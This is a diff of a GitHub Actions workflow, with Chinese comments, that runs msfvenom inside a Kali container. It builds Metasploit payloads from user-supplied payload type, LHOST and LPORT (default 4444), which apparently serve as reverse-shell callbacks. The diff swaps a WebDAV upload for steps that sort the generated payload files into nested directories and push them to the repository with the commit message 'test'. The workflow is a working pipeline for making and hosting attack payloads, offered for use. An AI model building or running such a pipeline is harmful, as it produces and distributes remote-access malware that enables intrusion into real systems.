@@ -21,10 +21,16 @@ on:
         required: true
         default: '4444'
 
+      
+
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
+      - name: Checkout code to specific directory
+        uses: actions/checkout@v6  # 推荐使用具体版本号，如 v4 或 v5
+        with:
+          path: gitdir
       - name: Generate Payload using Kali Docker
         run: |
           # 拉取 Kali 镜像
@@ -73,8 +79,33 @@ jobs:
             bash -c "apt-get update && \
                      apt-get install -y metasploit-framework && \
                      msfvenom $PLATFORM $FORMAT_FLAG -p $PAYLOAD LHOST=${{ github.event.inputs.lhost }} LPORT=${{ github.event.inputs.lport }} -o '$OUTPUT_FILE'"
-          curl -u ${{ secrets.WEBDAV_USER }}:${{ secrets.WEBDAV_PASS }} -T "${{ env.FILENAME }}.${{ env.EXT }}" "${{ secrets.WEBDAV_ADDR }}/vstudio/${{ env.FILENAME }}.${{ env.EXT }}"
-
+          for file in *.${EXT}; do
+              # 确保是文件（防止没有匹配到文件时出错）
+              if [[ -f "$file" ]]; then
+                  # --- 提取文件名核心部分（去掉.txt后缀）---
+                  # 例如：abcd1.txt -> abcd1
+                  filename="${file%.txt}"
+                
+                  # --- 字符串切片 ---
+                  # 一级目录：从第0个字符开始，取2个字符 (第1-2位)
+                  # 二级目录：从第2个字符开始，取2个字符 (第3-4位)
+                  dir1="${filename:0:2}"
+                  dir2="${filename:2:2}" # 注意：起始位置是2，长度是2
+        
+                  # --- 创建目录并复制文件 ---
+                  # mkdir -p 会自动创建父目录
+                  mkdir -p "gitdir/dldir/$dir1/$dir2"
+                
+                  # 复制文件（-v 参数显示详细过程）
+                  cp -v "$file" "gitdir/dldir/$dir1/$dir2/"
+              fi
+          done
+          cd gitdir
+          git add .
+          git config --global user.name "github-actions[bot]"
+          git config --global user.email "github-actions[bot]@users.noreply.github.com"
+          git commit -m "test"
+          git push
       - name: Upload Payload
         uses: actions/upload-artifact@v4
         with:
